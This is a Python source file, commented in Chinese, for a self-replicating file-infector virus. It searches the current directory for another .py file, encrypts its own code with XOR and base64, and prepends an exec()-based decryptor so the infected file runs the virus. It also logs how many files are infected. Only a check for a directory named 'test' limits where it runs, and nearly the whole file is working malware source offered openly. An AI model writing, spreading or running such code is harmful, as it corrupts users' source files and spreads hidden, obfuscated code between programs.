#!/usr/bin/env python3
import os
import logging
import platform
from datetime import datetime
import base64
import random

# 配置日志
logging.basicConfig(
    filename='./virus.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    force=True
)

def encrypt_code(code: str, key: int = None) -> tuple[str, int]:
    """
    使用异或加密和base64编码对代码进行加密
    """
    if key is None:
        key = random.randint(1, 255)
    
    # 对代码进行异或加密
    encrypted = ''.join(chr(ord(c) ^ key) for c in code)
    # 使用base64编码
    encoded = base64.b64encode(encrypted.encode()).decode()
    return encoded, key

def decrypt_code(encoded: str, key: int) -> str:
    """
    解密代码
    """
    try:
        # base64解码
        decoded = base64.b64decode(encoded).decode()
        # 异或解密
        decrypted = ''.join(chr(ord(c) ^ key) for c in decoded)
        return decrypted
    except Exception as e:
        logging.error(f"解密失败: {str(e)}")
        return None

def check_environment():
    """检查运行环境的安全性"""
    try:
        # 检查是否在测试目录中
        current_dir = os.path.basename(os.getcwd())
        if not (current_dir == 'test' or 'test' in current_dir.lower()):
            logging.warning("不在测试目录中，为安全起见停止执行")
            return False
            
        # 检查文件系统权限
        if not os.access('.', os.W_OK):
            logging.warning("当前目录没有写入权限")
            return False
            
        # 记录环境信息
        logging.info(f"操作系统: {platform.system()} {platform.release()}")
        logging.info(f"执行目录: {os.getcwd()}")
        return True
    except Exception as e:
        logging.error(f"环境检查失败: {str(e)}")
        return False

def get_virus():
    """获取病毒代码"""
    try:
        virus_code = '''
# --- VIRUS CODE START ---
import os
import logging
import platform
from datetime import datetime
import base64
import random

# 配置日志
logging.basicConfig(
    filename='./virus.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    force=True
)

def encrypt_code(code: str, key: int = None) -> tuple[str, int]:
    """
    使用异或加密和base64编码对代码进行加密
    """
    if key is None:
        key = random.randint(1, 255)
    
    # 对代码进行异或加密
    encrypted = ''.join(chr(ord(c) ^ key) for c in code)
    # 使用base64编码
    encoded = base64.b64encode(encrypted.encode()).decode()
    return encoded, key

def decrypt_code(encoded: str, key: int) -> str:
    """
    解密代码
    """
    try:
        # base64解码
        decoded = base64.b64decode(encoded).decode()
        # 异或解密
        decrypted = ''.join(chr(ord(c) ^ key) for c in decoded)
        return decrypted
    except Exception as e:
        logging.error(f"解密失败: {str(e)}")
        return None

def check_environment():
    """检查运行环境的安全性"""
    try:
        # 检查是否在测试目录中
        current_dir = os.path.basename(os.getcwd())
        if not (current_dir == 'test' or 'test' in current_dir.lower()):
            logging.warning("不在测试目录中，为安全起见停止执行")
            return False
            
        # 检查文件系统权限
        if not os.access('.', os.W_OK):
            logging.warning("当前目录没有写入权限")
            return False
            
        # 记录环境信息
        logging.info(f"操作系统: {platform.system()} {platform.release()}")
        logging.info(f"执行目录: {os.getcwd()}")
        return True
    except Exception as e:
        logging.error(f"环境检查失败: {str(e)}")
        return False

def get_virus():
    """获取病毒代码"""
    try:
        with open(__file__, 'r') as f:
            lines = f.readlines()
        virus_code = []
        virus_area = False
        for line in lines:
            if line.strip() == '# --- VIRUS CODE START ---':
                virus_area = True
            if virus_area:
                virus_code.append(line)
            if line.strip() == '# --- VIRUS CODE END ---':
                break
        return ''.join(virus_code)
    except Exception as e:
        logging.error(f"获取病毒代码失败: {str(e)}")
        return None

def infect(target_file):
    """感染目标文件"""
    try:
        with open(target_file, 'r') as f:
            original_code = f.read()
        
        if '# --- VIRUS CODE START ---' not in original_code:
            logging.info(f"开始感染文件: {target_file}")
            
            # 获取病毒代码
            virus_code = get_virus()
            if virus_code is None:
                return False
                
            # 加密病毒代码
            encrypted_code, key = encrypt_code(virus_code)
            
            # 生成解密器代码
            decryptor = f"""
import base64
def decrypt(c,k):
 try:
  d=base64.b64decode(c).decode()
  return ''.join(chr(ord(x)^k)for x in d)
 except:return''
exec(decrypt('{encrypted_code}',{key}))
"""
            
            # 写入文件
            with open(target_file, 'w') as f:
                f.write(decryptor + original_code)
                
            logging.info(f"成功感染文件: {target_file}")
            return True
        return False
    except (IOError, PermissionError) as e:
        logging.error(f"感染文件 {target_file} 失败: {str(e)}")
        return False

def find_target():
    """查找可感染的目标文件"""
    try:
        python_files = []
        for file in os.listdir('.'):
            if file.endswith('.py') and file != os.path.basename(__file__):
                try:
                    with open(file, 'r') as f:
                        content = f.read()
                    if '# --- VIRUS CODE START ---' not in content:
                        python_files.append(file)
                except Exception as e:
                    logging.error(f"读取文件 {file} 失败: {str(e)}")
                    continue
        return python_files[0] if python_files else None
    except Exception as e:
        logging.error(f"查找目标文件失败: {str(e)}")
        return None

def get_infection_stats():
    """获取感染统计信息"""
    try:
        infected_count = 0
        total_py_files = 0
        for file in os.listdir('.'):
            if file.endswith('.py'):
                total_py_files += 1
                try:
                    with open(file, 'r') as f:
                        content = f.read()
                    if 'exec(decrypt(' in content or '# --- VIRUS CODE START ---' in content:
                        infected_count += 1
                except Exception as e:
                    logging.error(f"统计时读取文件 {file} 失败: {str(e)}")
        
        stats = f"感染统计 - 总Python文件数: {total_py_files}, 已感染文件数: {infected_count}"
        logging.info(stats)
        return infected_count, total_py_files
    except Exception as e:
        logging.error(f"获取感染统计失败: {str(e)}")
        return 0, 0

def run():
    """主运行函数"""
    logging.info("病毒程序开始执行")
    
    if not check_environment():
        logging.error("环境检查未通过，停止执行")
        return
    
    target = find_target()
    if target:
        if infect(target):
            get_infection_stats()
    else:
        logging.info("未找到可感染的目标文件")
    
    logging.info("病毒程序执行完成")

run()  # 执行病毒
# --- VIRUS CODE END ---
'''
        return virus_code
    except Exception as e:
        logging.error(f"获取病毒代码失败: {str(e)}")
        return None

def infect(target_file):
    """感染目标文件"""
    try:
        with open(target_file, 'r') as f:
            original_code = f.read()
        
        if '# --- VIRUS CODE START ---' not in original_code:
            logging.info(f"开始感染文件: {target_file}")
            
            # 获取病毒代码
            virus_code = get_virus()
            if virus_code is None:
                return False
                
            # 加密病毒代码
            encrypted_code, key = encrypt_code(virus_code)
            
            # 生成解密器代码
            decryptor = f"""
import base64
def decrypt(c,k):
 try:
  d=base64.b64decode(c).decode()
  return ''.join(chr(ord(x)^k)for x in d)
 except:return''
exec(decrypt('{encrypted_code}',{key}))
"""
            
            # 写入文件
            with open(target_file, 'w') as f:
                f.write(decryptor + original_code)
                
            logging.info(f"成功感染文件: {target_file}")
            return True
        return False
    except (IOError, PermissionError) as e:
        logging.error(f"感染文件 {target_file} 失败: {str(e)}")
        return False

def find_target():
    """查找可感染的目标文件"""
    try:
        python_files = []
        for file in os.listdir('.'):
            if file.endswith('.py') and file != os.path.basename(__file__):
                try:
                    with open(file, 'r') as f:
                        content = f.read()
                    if '# --- VIRUS CODE START ---' not in content:
                        python_files.append(file)
                except Exception as e:
                    logging.error(f"读取文件 {file} 失败: {str(e)}")
                    continue
        return python_files[0] if python_files else None
    except Exception as e:
        logging.error(f"查找目标文件失败: {str(e)}")
        return None

def get_infection_stats():
    """获取感染统计信息"""
    try:
        infected_count = 0
        total_py_files = 0
        for file in os.listdir('.'):
            if file.endswith('.py'):
                total_py_files += 1
                try:
                    with open(file, 'r') as f:
                        content = f.read()
                    if 'exec(decrypt(' in content or '# --- VIRUS CODE START ---' in content:
                        infected_count += 1
                except Exception as e:
                    logging.error(f"统计时读取文件 {file} 失败: {str(e)}")
        
        stats = f"感染统计 - 总Python文件数: {total_py_files}, 已感染文件数: {infected_count}"
        logging.info(stats)
        return infected_count, total_py_files
    except Exception as e:
        logging.error(f"获取感染统计失败: {str(e)}")
        return 0, 0

def run():
    """主运行函数"""
    logging.info("病毒程序开始执行")
    
    if not check_environment():
        logging.error("环境检查未通过，停止执行")
        return
    
    target = find_target()
    if target:
        if infect(target):
            get_infection_stats()
    else:
        logging.info("未找到可感染的目标文件")
    
    logging.info("病毒程序执行完成")

run()  # 执行病毒